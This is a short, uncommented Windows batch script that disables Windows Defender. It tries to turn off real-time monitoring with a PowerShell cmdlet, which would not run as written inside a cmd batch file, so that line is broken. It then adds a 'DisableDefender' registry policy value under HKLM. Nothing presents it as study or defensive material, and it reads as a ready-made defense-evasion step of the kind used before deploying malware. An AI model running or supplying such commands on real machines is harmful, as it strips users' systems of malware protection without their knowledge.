@ECHO OFF
cls


Set-MpPreference -DisableRealtimeMonitoring $true

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableDefender /t REG_DWORD /d "1" /f


exit